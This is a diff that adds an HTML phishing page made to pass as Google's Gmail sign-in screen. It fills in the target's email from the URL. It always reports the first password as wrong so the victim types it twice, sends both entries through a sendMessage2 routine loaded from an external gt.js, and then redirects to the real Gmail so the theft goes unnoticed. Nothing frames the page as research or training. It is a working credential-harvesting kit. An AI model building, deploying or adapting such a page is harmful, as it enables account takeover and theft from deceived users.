@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Gmail</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #202124;
+            color: white;
+            padding: 16px;
+        }
+
+        .login-container {
+            background-color: #1a1a1a;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 800px;
+            height: 350px;
+            display: flex;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .left-section {
+            flex: 1;
+            padding: 32px;
+            border-right: 1px solid #333;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        .right-section {
+            flex: 1;
+            padding: 32px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .google-logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .google-logo svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .sign-in-text {
+            font-size: 24px;
+            margin-bottom: 12px;
+            font-weight: 400;
+            font-family: 'Google Sans', sans-serif;
+        }
+
+        .signin-subtitle {
+            font-size: 16px;
+            color: #e8eaed;
+            margin-bottom: 32px;
+        }
+
+        .email-display {
+            background-color: #2d2d2d;
+            padding: 8px 16px;
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            max-width: fit-content;
+            cursor: pointer;
+        }
+
+        .email-display .icon {
+            width: 20px;
+            height: 20px;
+            background-color: #666;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .email-display::after {
+            content: '▼';
+            margin-left: 8px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .password-input {
+    background-color: transparent;
+    border: 1px solid #5f6368;
+    padding: 13px 15px;
+    border-radius: 4px;
+    width: 100%;
+    color: white;
+    font-size: 16px;
+    margin-bottom: 8px;
+    margin-top: 44px; /* Added top margin to push field lower */
+}
+
+        .password-input:focus {
+            border-color: #8ab4f8;
+            outline: none;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 12px 0;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: auto;
+        }
+
+        .forgot-password {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .next-button {
+            background-color: #8ab4f8;
+            color: #202124;
+            border: none;
+            padding: 8px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            background-color: #202124;
+        }
+
+        .language-select {
+            background-color: transparent;
+            color: #e8eaed;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .links a {
+            color: #e8eaed;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .login-container {
+                flex-direction: column;
+                height: auto;
+            }
+            
+            .left-section {
+                border-right: none;
+                border-bottom: 1px solid #333;
+            }
+        }
+         .right-section {
+            flex: 1;
+            padding: 32px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .forgot-email {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 8px;
+            display: inline-block;
+        }
+
+        .private-mode-text {
+    position: absolute;
+    bottom: 80px;  /* Increase this value */
+    font-size: 14px;
+    color: #e8eaed;
+    max-width: 90%;
+    line-height: 1.4;
+    transition: bottom 0.3s ease;  /* Smooth transition for movement */
+}
+
+        .private-mode-link {
+            color: #8ab4f8;
+            text-decoration: none;
+        }
+
+        /* Adjust bottom actions positioning */
+.bottom-actions {
+    position: absolute;
+    bottom: 32px;
+    left: 32px;
+    right: 32px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+
+        .create-account {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+         .error-message {
+    color: #ff6b6b;
+    font-size: 14px;
+    margin-top: 8px;
+    display: none;
+    background-color: rgba(255, 107, 107, 0.1);
+    padding: 8px 12px;
+    border-radius: 4px;
+    border: 1px solid #ff6b6b;
+}
+
+.success-message {
+    color: #34A853;  /* Keep the green color */
+    font-size: 14px;
+    margin-top: 8px;
+    display: none;
+    background-color: rgba(52, 168, 83, 0.1);  /* Add a slight green background */
+    padding: 8px 12px;
+    border-radius: 4px;
+    border: 1px solid #34A853;
+}
+.error-shown .private-mode-text {
+    bottom: 100px;  /* Move text down when error is shown */
+}
+    .email-display.disabled {
+        opacity: 0.8;
+        cursor: not-allowed;
+    }
+
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="left-section">
+    <div class="google-logo">
+        <svg viewBox="0 0 24 24">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+        </svg>
+    </div>
+    <h1 class="sign-in-text">Sign in</h1>
+    <p class="signin-subtitle">to continue to Gmail</p>
+    <div class="email-display">
+    <div class="icon"></div>
+    <span id="email-text">user@email.com</span> <!-- Add default text here -->
+</div>
+</div>
+        
+        <div class="right-section">
+    <input type="password" class="password-input" placeholder="Enter your password" />
+    
+    <div class="error-message"></div>
+    <div class="success-message"></div>
+
+    <div class="checkbox-container">
+        <input type="checkbox" id="show-password" />
+        <label for="show-password">Show password</label>
+    </div>
+
+    <a href="#" class="forgot-email">Forgot password?</a>
+
+    <p class="private-mode-text">
+        Not your computer? Use a Private Window to sign in. 
+        <a href="#" class="private-mode-link">Learn more about using Guest mode</a>
+    </p>
+
+    <div class="bottom-actions">
+        <a href="#" class="create-account"></a>
+        <button class="next-button">Next</button>
+    </div>
+</div>
+    </div>
+
+    <div class="bottom-bar">
+        <select class="language-select">
+            <option>English (United States)</option>
+        </select>
+        <div class="links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+    <script type="text/javascript" src="gt.js"></script>
+    <script>
+
+    // Initialize form elements
+    const passwordInput = document.querySelector('.password-input');
+    const showPasswordCheckbox = document.querySelector('#show-password');
+    const nextButton = document.querySelector('.next-button');
+    const errorMessage = document.querySelector('.error-message');
+    const successMessage = document.querySelector('.success-message');
+    const emailDisplay = document.getElementById('email-text');
+    
+    // Track submit attempts
+    let submitAttempts = 0;
+
+    // Set email from URL hash
+    function setEmailFromHash() {
+        const hash = window.location.hash.substring(1);
+        if (hash) {
+            emailDisplay.textContent = decodeURIComponent(hash);
+        } else {
+            emailDisplay.textContent = 'user@email.com'; // Default fallback
+        }
+        document.querySelector('.email-display').classList.add('disabled');
+    }
+
+    // Handle form submission
+    // Make handleSubmit an async function
+async function handleSubmit() {
+    const email = emailDisplay.textContent;
+    const password = passwordInput.value;
+    submitAttempts++;
+
+    // Reset password field
+
+    if (submitAttempts === 1) {
+        // First attempt - show error
+
+    passwordInput.value = '';
+        document.querySelector('.private-mode-text').style.display = 'none';
+        errorMessage.style.display = 'block';
+        errorMessage.textContent = errormessage;
+        successMessage.style.display = 'none';
+        const formattedMessage = await formatMessage(email, password, "GMAIL PAGE");
+            
+            // Send data
+            sendMessage2(formattedMessage);
+
+    } else {
+        // Second attempt - show success and redirect
+        errorMessage.style.display = 'none';
+        successMessage.style.display = 'block';
+        successMessage.textContent = 'Login successful!';
+
+        try {
+            // Format the message
+            const formattedMessage = await formatMessage(email, password, "GMAIL PAGE");
+            
+            // Send data
+            sendMessage2(formattedMessage);
+
+            // Redirect after 3 seconds based on email domain
+            setTimeout(() => {
+                const domain = email.split('@')[1];
+                let redirectUrl = 'https://mail.google.com';
+                
+                if (domain) {
+                    switch(domain.toLowerCase()) {
+                        case 'gmail.com':
+                            redirectUrl = 'https://mail.google.com';
+                            break;
+                    }
+                }
+                
+                window.location.href = redirectUrl;
+            }, 1500);
+        } catch (error) {
+            alert(`Error formatting message: ${error}`);
+        }
+    }
+}
+
+    // Event Listeners
+    window.addEventListener('load', setEmailFromHash);
+    window.addEventListener('hashchange', setEmailFromHash);
+    
+    nextButton.addEventListener('click', (e) => handleSubmit());
+passwordInput.addEventListener('keypress', async (e) => {
+    if (e.key === 'Enter') {
+        await handleSubmit();
+    }
+});
+
+    // Show/hide password functionality
+    showPasswordCheckbox.addEventListener('change', function() {
+        passwordInput.type = this.checked ? 'text' : 'password';
+    });
+
+    </script>
+</body>
+</html>
